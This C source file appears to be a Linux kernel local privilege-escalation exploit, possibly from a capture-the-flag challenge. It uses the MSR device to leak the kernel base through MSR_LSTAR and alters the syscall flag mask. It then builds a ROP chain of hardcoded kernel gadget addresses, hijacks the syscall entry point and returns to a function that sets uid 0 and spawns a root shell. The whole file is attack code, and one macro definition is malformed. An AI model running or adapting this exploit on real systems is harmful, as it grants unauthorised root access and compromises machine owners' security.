#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

typedef uint64_t u64;

#define X86_EFLAGS_AC_BIT 18
#define MSR_EFER                0xc0000080 /* extended feature register */
#define MSR_STAR                0xc0000081 /* legacy mode SYSCALL target */
#define MSR_LSTAR                0xc0000082 /* long mode SYSCALL target */
#define MSR_CSTAR                0xc0000083 /* compat mode SYSCALL target */
#define MSR_SYSCALL_MASK        0xc0000084 /* EFLAGS mask for syscall */
#define MSR_FS_BASE                0xc0000100 /* 64bit FS base */
#define MSR_GS_BASE                0xc0000101 /* 64bit GS base */
#define MSR_KERNEL_GS_BASE        0xc0000102 /* SwapGS GS shadow */

#define MSR_IA32_SYSENTER_CS      1           0x00000174
#define MSR_IA32_SYSENTER_ESP                0x00000175
#define MSR_IA32_SYSENTER_EIP                0x00000176

#define target "/dev/cpu/0/msr"

int fd;

u64 read_msr(u64 msr) {
    u64 value;
    lseek(fd, msr, 0);
    read(fd, &value, 8);
    return value;
}

u64 write_msr(u64 msr, u64 value) {
    lseek(fd, msr, 0);
    write(fd, &value, 8);
}

void fatal(char *msg) 
{
    perror(msg);
    exit(-1);
}

static void win() {
    setuid(0); setgid(0);
    if (getuid() != 0) {
        puts("[-] not root");
        exit(-1);
    }
    puts("[+] win!");
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve(argv[0], argv, envp);
    fatal("execve");
}

u64 kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((u64)(addr) - 0xffffffff81000000 + kernel_base)

u64 user_cs, user_ss, user_sp, user_rflags;

void save_state() {
    asm(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax"
    );
}

void set_ac() {
    asm(
        "pushf;"
        "pop user_rflags;"
    );

    user_rflags |= 1 << X86_EFLAGS_AC_BIT;

    asm(
        "push user_rflags;"
        "popf;"
    );
}

int main() {

    save_state();

    fd = open(target, O_RDWR);
    kernel_base = read_msr(MSR_LSTAR) - 0x800040;
    printf("[+] Kernel base: 0x%llx\n", kernel_base);
    u64 ret = kernel_base + (0xffffffff818001d2-0xffffffff81000000);
    printf("[+] 0x%llx\n", read_msr(MSR_SYSCALL_MASK));

    // asm inline 
    printf("fmask: 0x%lx\n", read_msr(MSR_SYSCALL_MASK) & ~0x40000);

    write_msr(MSR_SYSCALL_MASK, (read_msr(MSR_SYSCALL_MASK) & ~0x40000));

    u64 *stack = mmap(NULL, 0x1000, 7, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    u64 *rop = &stack[200];
    u64 *cc = &rop[0];

    *cc++ = kernel_base + 0x801700 + 69;
    *cc++ = KADDR(0xffffffff81001a28);
    *cc++ = KADDR(0xffffffff81e44860);
    *cc++ = KADDR(0xffffffff8108b020); 
    *cc++ = KADDR(0xffffffff81031ed0);
    *cc++ = KADDR(0xffffffff81801530 + 88);
    *cc++ = 0;
    *cc++ = &win;
    *cc++ = user_cs;
    *cc++ = user_rflags;
    *cc++ = user_sp;
    *cc++ = user_ss;

    write_msr(MSR_LSTAR, ret);

    set_ac();

    asm volatile(
        "mov %0, %%rsp\t\n"
        "syscall\t\n"
        :
        : "r"(rop)
    );   
    return 0;
}

